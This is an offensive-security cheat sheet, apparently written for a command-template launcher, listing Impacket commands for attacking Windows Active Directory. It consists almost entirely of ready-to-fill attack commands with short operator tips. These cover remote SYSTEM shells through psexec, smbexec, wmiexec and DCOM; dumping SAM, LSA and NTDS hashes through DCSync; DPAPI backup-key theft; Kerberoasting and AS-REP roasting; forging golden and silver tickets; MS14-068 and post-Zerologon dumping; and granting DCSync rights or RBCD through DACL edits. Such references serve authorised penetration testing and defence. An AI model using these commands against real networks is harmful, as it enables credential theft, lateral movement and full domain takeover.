# Impacket

<!-- cheat
export impacket_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

if $auth_method == hash
var auth_target := $domain/'$user'@$rhost_ip
var auth_flags := -hashes :$credential
fi

if $auth_method == password
var auth_target := $domain/'$user':'$credential'@$rhost_ip
var auth_flags := ''
fi

if $auth_method == kerberos
var auth_target := $domain
var auth_flags := -k -no-pass
fi
-->

<!-- cheat
export impacket_domain_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --fzf-overrides "--with-nth=2 --header=Select\ authentication\ mode\ (Kerberos\ needs\ no\ credential)" --map "cut -f1"

if $auth_method != kerberos
var credential --- --header "Credential"
fi

if $auth_method == hash
var auth_target := $domain/'$user'
var auth_flags := -hashes :$credential
fi

if $auth_method == password
var auth_target := $domain/'$user':'$credential'
var auth_flags := ''
fi

if $auth_method == kerberos
var auth_target := $domain/'$user'
var auth_flags := -k -no-pass
fi
-->

## Impacket psexec

### psexec

SYSTEM shell on the target via the classic psexec service primitive (drops binary to ADMIN$, registers a service, runs it). Loud but reliable.

```sh title:"SYSTEM shell via service primitive"
psexec.py $auth_target $auth_flags -service-name $service_name $ps_exec_template
```
<!-- cheat
import domain_ip
import templates
import users
import impacket_auth
var service_name
-->

## Impacket smbexec

### smbexec

Semi-interactive SYSTEM shell via service exec, but no writable share needed. Output is read back via SMB pipes.

```sh title:"Semi-interactive SYSTEM shell, no writable share needed"
smbexec.py $auth_target $auth_flags -service-name $service_name
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var service_name
-->

## Impacket atexec

### atexec

Run a single command on the target via the Task Scheduler service. No writable share needed; runs as SYSTEM.

```sh title:"Single command via Task Scheduler"
atexec.py $auth_target $auth_flags $commands_template
```
<!-- cheat
import domain_ip
import users
import templates
import impacket_auth
-->

## Impacket wmiexec

### wmiexec

Shell as the authenticated user (not SYSTEM) over WMI. Quieter than psexec/smbexec since no service is registered.

```sh title:"WMI shell as user, no service registered"
wmiexec.py $auth_target $auth_flags $commands_template
```
<!-- cheat
import domain_ip
import templates
import users
import impacket_auth
-->

## Impacket dcomexec

### dcomexec

Semi-interactive shell via DCOM objects. Useful when WMI/SCM paths are noisy or blocked; `MMC20` is the most common object when no interactive user session exists.

```sh title:"DCOM shell or command execution"
dcomexec.py $auth_target $auth_flags -object $dcom_object $commands_template
```
<!-- cheat
import domain_ip
import templates
import users
import impacket_auth
var dcom_object = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --header 'DCOM object'
-->

### dcomexec no output

Run a single command without fetching output over SMB.

```sh title:"DCOM silent command, no SMB output retrieval"
dcomexec.py $auth_target $auth_flags -object $dcom_object -silentcommand -nooutput $commands_template
```
<!-- cheat
import domain_ip
import templates
import users
import impacket_auth
var dcom_object = printf 'MMC20\nShellWindows\nShellBrowserWindow\n' --- --header 'DCOM object'
-->

## Impacket secretsdump

### secretsdump

Dump SAM, LSA, cached creds, and (with DCSync rights) NTDS.dit hashes from a remote host.

```sh title:"Dump SAM/LSA/NTDS via DRSUAPI"
secretsdump.py $auth_target $auth_flags $secrets_dump_templates
```
<!-- cheat
import domain_ip
import templates
import users
import impacket_auth
-->

### dpapi backup key

Retrieve the domain DPAPI backup key from a DC. This PVK can decrypt domain users' DPAPI masterkeys offline.

```sh title:"Export domain DPAPI backup key"
dpapi.py backupkeys -t $auth_target $auth_flags -export
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

### dpapi masterkey with backup key

Decrypt a DPAPI masterkey with the domain backup key.

```sh title:"Decrypt DPAPI masterkey with backup key"
dpapi.py masterkey -file $masterkey_file -pvk $backup_key_pvk
```
<!-- cheat
var masterkey_file
var backup_key_pvk
-->

### dpapi credential blob

Decrypt a DPAPI Credential Manager blob once you have the plaintext masterkey.

```sh title:"Decrypt DPAPI credential file with masterkey"
dpapi.py credential -file $credential_file -key $masterkey
```
<!-- cheat
var credential_file
var masterkey
-->

### regsecrets

Dump SAM, cached domain credentials, and LSA secrets remotely through registry access. Lighter than full `secretsdump` when you do not need NTDS.

```sh title:"Dump SAM/cache/LSA via remote registry"
regsecrets.py $auth_target $auth_flags -outputfile $output_prefix
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var output_prefix
-->

## Impacket getTGT

### getTGT

Request a Kerberos TGT for `$user` and write a ccache. Set `KRB5CCNAME` to the file before running Kerberos-aware tooling.

```sh title:"Request TGT to ccache"
getTGT.py $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## Impacket smbclient

### smbclient

Interactive SMB client for browsing shares and pulling files.

```sh title:"Interactive SMB browser"
smbclient.py $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

## Impacket mssqlclient

### mssqlclient

Interactive MSSQL client over Windows auth. Useful for `EXEC xp_cmdshell` and SQL-side enumeration.

```sh title:"Interactive MSSQL via Windows auth"
mssqlclient.py -windows-auth $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

## Impacket ticketConverter

### kirbi to ccache

Convert a Rubeus-style `.kirbi` ticket into a Linux ccache and export `KRB5CCNAME`. Bridges Windows-side ticket extraction into impacket workflows.

```sh title:"Convert .kirbi to ccache and export KRB5CCNAME"
ticketConverter.py $file ticket.ccache; export KRB5CCNAME=ticket.ccache
```
<!-- cheat
import files
-->

## Impacket ticketer ( request tickets)

### Forge silver ticket

Forge a Kerberos service ticket for a specific SPN with the service account's NT hash. Lets you access just that service without ever talking to the KDC.

```sh title:"Forge silver ticket for one SPN with service NT hash"
ticketer.py -nthash $nthash -domain-sid $domain_sid -domain $domain -spn '$spn/$rhost_name:$group_id' $name
```
<!-- cheat
import domain_ip
import users
var nthash
var spn
var rhost_name
var group_id
var name
-->

## Impacket describeTicket

### Ticket session key

Extract the session key from a ccache. Step 1 of the no-SPN targeted Kerberoast trick: set the target's NT hash to the session key so the ticket cracks instantly.

```sh title:"Read TGT session key from ccache for no-SPN roast"
describeTicket.py $ccache_file | grep 'Ticket Session Key'
```
<!-- cheat
var ccache_file
-->

## Impacket changePassword

### Set NT hash to session key

Step 2 of the no-SPN roast: write the TGT session key as the controlled account's new NT hash so subsequent service tickets are encrypted with a known key and crack instantly.

```sh title:"Write session key as target NT hash (no-SPN roast step 2)"
changepasswd.py -newhashes :$TGTSessionKey $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var TGTSessionKey
-->

### SMB server anonymous

Stand up an anonymous SMB server hosting the current directory. Modern Windows often refuses anonymous mounts, so fall back to dummy creds if this fails.

```sh title:"Anonymous SMB server hosting cwd, may be refused"
smbserver.py share $(pwd) -smb2support
```

### SMB server with creds

SMB server with dummy creds. Required when the target enforces signed/authenticated access.

```sh title:"SMB server with dummy creds, works under signing policy"
smbserver.py share $(pwd) -smb2support -user $user -password $pass
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### RaiseChild parent escalation

Child to parent domain escalation via SID history injection. With Domain Admin in the child, forges a TGT for the parent and runs a command there.

```sh title:"Child to parent domain escalation via SID history"
raiseChild.py -target-exec $rhost_ip $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

### Domain SID lookup

Look up the domain SID via MS-LSAT. Required for ticketer (golden/silver) and for SID-history attacks.

```sh title:"Resolve domain SID for ticketer and SID-history attacks"
lookupsid.py $auth_target $auth_flags | grep "Domain SID"
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

### Forge golden ticket

Forge a TGT signed by the krbtgt NT hash with Enterprise Admins (RID 519) in extra-sids. Survives password resets except for krbtgt itself.

```sh title:"Forge golden TGT with Enterprise Admins SID-519"
ticketer.py -nthash $nthash -domain $domain -domain-sid $domain_sid -extra-sid $extra_sid-519 fakeuser
```
<!-- cheat
import domain_ip
import users
var nthash
var extra_sid
-->

## GetUserSPNs

### Roast all SPNs

Kerberoast every SPN-enabled account at once and print the krb5tgs hashes for offline cracking.

```sh title:"Kerberoast every SPN-enabled account, print to stdout"
GetUserSPNs.py -dc-ip $rhost_ip $auth_target $auth_flags -request
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

### Targeted Kerberoast

Roast a single named account. Use after writing an SPN onto a target with bloodyAD/PowerView (targeted Kerberoasting).

```sh title:"Targeted Kerberoast a single named account"
GetUserSPNs.py -dc-ip $rhost_ip $auth_target $auth_flags -request-user $target_user
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var target_user
-->

### Targeted Kerberoast to file

Targeted Kerberoast and save the hash directly to a file ready for hashcat.

```sh title:"Targeted Kerberoast, write hash to .hash file"
GetUserSPNs.py -dc-ip $rhost_ip $auth_target $auth_flags -request-user $target_user -outputfile $target_user.hash
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var target_user
-->

### Cross-domain SPN list

List SPNs in a different domain you have a trust into. Enumeration only, no ticket request.

```sh title:"List SPNs in trusted/foreign domain, no roast"
GetUserSPNs.py -target-domain $alt_domain $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var alt_domain
-->

### Cross-domain Kerberoast

Kerberoast across a trust into another domain. Pair with `-outputfile` if you want the hashes saved.

```sh title:"Kerberoast across trust into a foreign domain"
GetUserSPNs.py -request -target-domain $alt_domain $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var alt_domain
-->

### Pre-auth-less Kerberoast

Kerberoast SPNs that don't require pre-auth (`UF_NO_AUTH_DATA_REQUIRED` / `DONT_REQ_PREAUTH`). Works without valid creds, given a userlist.

```sh title:"Roast pre-auth-disabled SPNs from a userlist, no creds"
GetUserSPNs.py -no-preauth $user -usersfile users.txt  -dc-host $rhost_name.$domain $domain/
```
<!-- cheat
var user
var rhost_name
var domain
-->

## GetNPUsers (ASREPRoast)

### Unauthenticated ASREPRoast

Spray a userlist with no creds and request AS-REPs for any user with `DONT_REQ_PREAUTH` set. Captures the AS-REP roastable hash for offline cracking.

```sh title:"ASREPRoast unauthenticated, spray userlist via GetNPUsers"
GetNPUsers.py -dc-ip $rhost_ip $domain/ -usersfile $users_file -format hashcat -outputfile asreproast.out
```
<!-- cheat
import domain_ip
var users_file
var domain
-->

### Authenticated ASREPRoast

With valid creds, query LDAP for accounts with `DONT_REQ_PREAUTH` and request their AS-REPs.

```sh title:"Authenticated ASREPRoast via LDAP query"
GetNPUsers.py -dc-ip $rhost_ip $auth_target $auth_flags -request -format hashcat -outputfile asreproast.out
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## getST (S4U / silver ticket impersonate)

### S4U2Self+S4U2Proxy impersonate

Use a controlled service account's TGT to S4U-impersonate any user to a target service (`-spn cifs/$target`). Bread-and-butter step in RBCD and constrained-delegation abuse.

```sh title:"S4U2Self+S4U2Proxy impersonate target user to a service"
getST.py -spn cifs/$rhost_name $auth_target $auth_flags -impersonate $target_user
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var rhost_name
var target_user
-->

## goldenPac (MS14-068)

### goldenPac PAC forgery

MS14-068: forge a PAC with Domain Admin privileges and exec a command via psexec. Only useful on unpatched DCs but trivial when applicable.

```sh title:"MS14-068 forged PAC psexec"
goldenPac.py -dc-ip $rhost_ip $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

## GetADUsers

### List domain users

Pull every user object with email addresses and metadata. Use after low-priv auth as quick AD recon for spraying / phishing prep.

```sh title:"Dump all domain users with email + metadata"
GetADUsers.py -all $auth_target $auth_flags -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## GetADComputers

### List domain computers

Enumerate computer accounts through LDAP. Add `-resolveIP` when you want DNS lookups resolved through the DC.

```sh title:"List domain computer accounts"
GetADComputers.py $auth_target $auth_flags -dc-ip $rhost_ip -resolveIP
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## addcomputer

### Add machine account

Create a computer account when `ms-DS-MachineAccountQuota` allows it. Common first step for RBCD and shadow credential chains.

```sh title:"Create computer account via Impacket addcomputer"
addcomputer.py $auth_target $auth_flags -dc-ip $rhost_ip -computer-name "$computer_name$" -computer-pass $computer_pass
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var computer_name
var computer_pass
-->

## dacledit

### Read target DACL

Read ACEs from a target object over LDAP.

```sh title:"Read AD object DACL"
dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -target $target_object -action read
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var target_object
-->

### Grant FullControl

Write a FullControl ACE for a controlled principal on a target object.

```sh title:"Grant FullControl with dacledit"
dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -principal $controlled_object -target $target_object -action write -rights FullControl
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var controlled_object
var target_object
-->

### Grant DCSync

Write DCSync replication rights on the domain object.

```sh title:"Grant DCSync rights with dacledit"
dacledit.py $auth_target $auth_flags -dc-ip $rhost_ip -principal $controlled_object -target-dn $domain_dn -action write -rights DCSync
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var controlled_object
var domain_dn
-->

## owneredit

### Change object owner

Set a controlled principal as owner of a target object, then use `dacledit.py` to grant usable rights.

```sh title:"Change AD object owner"
owneredit.py $auth_target $auth_flags -dc-ip $rhost_ip -new-owner $controlled_object -target $target_object -action write
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var controlled_object
var target_object
-->

## rbcd

### Read RBCD

Read the `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor on a target computer.

```sh title:"Read target RBCD entries"
rbcd.py $auth_target $auth_flags -dc-ip $rhost_ip -delegate-to "$target_computer$" -action read
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var target_computer
-->

### Write RBCD

Allow a controlled computer account to delegate to a target computer.

```sh title:"Write RBCD delegation entry"
rbcd.py $auth_target $auth_flags -dc-ip $rhost_ip -delegate-from "$controlled_computer$" -delegate-to "$target_computer$" -action write
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var controlled_computer
var target_computer
-->

## findDelegation

### Enumerate delegation

Enumerate unconstrained delegation, constrained delegation, and RBCD relationships in the domain.

```sh title:"Enumerate AD delegation relationships"
findDelegation.py $auth_target $auth_flags -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## ldap_shell

### Interactive LDAP shell

Open Impacket's LDAP shell for AD object reads and common modifications such as adding computers, changing passwords, and setting RBCD.

```sh title:"Open interactive LDAP shell"
ldap_shell.py $auth_target@$rhost_ip $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## machineAccountQuota

### Check MachineAccountQuota

Read `ms-DS-MachineAccountQuota` to see whether regular users can create computer accounts.

```sh title:"Check ms-DS-MachineAccountQuota"
machineAccountQuota.py $auth_target $auth_flags -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
-->

## GetLAPSPassword

### Dump readable LAPS passwords

Read LAPS passwords from LDAP for computer objects the current principal can read.

```sh title:"Dump readable LAPS passwords"
GetLAPSPassword.py $auth_target $auth_flags -dc-ip $rhost_ip -outputfile $output_file
```
<!-- cheat
import domain_ip
import users
import impacket_domain_auth
var output_file
-->

## Impacket recon misc

### reg.py remote query

Query a remote registry key over MS-RRP. Useful for grabbing GP cached creds, AutoLogon, WinLogon defaults from a host you can auth to.

```sh title:"Query a remote registry key via reg.py"
reg.py $auth_target $auth_flags query -keyName $reg_key -s
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var reg_key
-->

### rpcdump endpoints

List every RPC endpoint exposed on the target. Pair with coerce / vuln-RPC hunting.

```sh title:"List remote RPC endpoint mapper output"
rpcdump.py $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

### services management

Remote service control (start/stop/create/delete/config) via MS-SCMR. Mirrors `sc` but driven from Linux.

```sh title:"Manage a remote service (start/stop/create/...)"
services.py $auth_target $auth_flags $action
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var action = printf '%s\n' 'list' 'status' 'config' 'start' 'stop' 'delete' 'create' 'change' --- --header 'Service action'
-->

### getArch

Probe MSRPC to determine whether the target is x64 or x86. Quick recon for picking the right payload format.

```sh title:"Probe target architecture via MSRPC"
getArch.py -target $rhost_ip
```
<!-- cheat
import domain_ip
-->

### netview enumeration

Enumerate shares, sessions, and logged-on users across targets. Requires working DNS resolution from the attacker box.

```sh title:"Enumerate shares/sessions/users across a target list"
netview.py $auth_target $auth_flags -target $rhost_ip -users $users_file
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var users_file
-->

### samrdump SAM info

Pull info from the Security Account Manager (system accounts, shares, etc.) without a full DCSync.

```sh title:"Dump local SAM info via MS-SAMR"
samrdump.py $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->

### DumpNTLMInfo

Perform unauthenticated NTLM negotiation and print host/domain/build metadata plus SMB signing status.

```sh title:"Unauthenticated NTLM target fingerprint"
DumpNTLMInfo.py $rhost_ip
```
<!-- cheat
import domain_ip
-->

### Check LDAP relay status

Check LDAP signing and channel binding enforcement on a DC to decide whether LDAP/LDAPS relay is viable.

```sh title:"Check LDAP signing and channel binding"
CheckLDAPStatus.py -dc-ip $rhost_ip -domain $domain
```
<!-- cheat
import domain_ip
var domain
-->

## Impacket secretsdump (offline / variants)

### Local SAM offline

Crack the SAM+SYSTEM hive pair you've already exfiltrated. Useful after offline imaging or a `reg save` chain.

```sh title:"Offline SAM dump from SYSTEM + SAM hives"
secretsdump.py -system $system_hive -sam $sam_hive LOCAL
```
<!-- cheat
var system_hive
var sam_hive
-->

### Local NTDS offline

Crack an NTDS.dit you've already exfiltrated. Pair with a SYSTEM hive copy taken from the same DC.

```sh title:"Offline NTDS.dit dump with SYSTEM hive"
secretsdump.py -ntds $ntds_file -system $system_hive LOCAL -outputfile $output_prefix
```
<!-- cheat
var ntds_file
var system_hive
var output_prefix
-->

### Zerologon anonymous DCSync

After zerologon (CVE-2020-1472), the DC machine account has an empty password. Pull just the Administrator hash anonymously.

```sh title:"Anonymous DCSync after zerologon - Administrator only"
secretsdump.py $domain/$dc_netbios\$@$rhost_ip -no-pass -just-dc-user Administrator
```
<!-- cheat
import domain_ip
var domain
var dc_netbios
-->

### Just DC NTLM hashes

DCSync but only the NT hashes, to file. Faster and quieter than a full dump when you only need NTLM material.

```sh title:"DCSync, just NTLM hashes, write to file"
secretsdump.py -just-dc-ntlm -outputfile $output_prefix $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var output_prefix
-->

### DCSync with metadata

DCSync with pwd-last-set and user-status alongside hashes. Cleaner for spotting stale accounts.

```sh title:"DCSync with pwd-last-set + user-status metadata"
secretsdump.py -just-dc -pwd-last-set -user-status -outputfile $output_prefix $auth_target $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
var output_prefix
-->
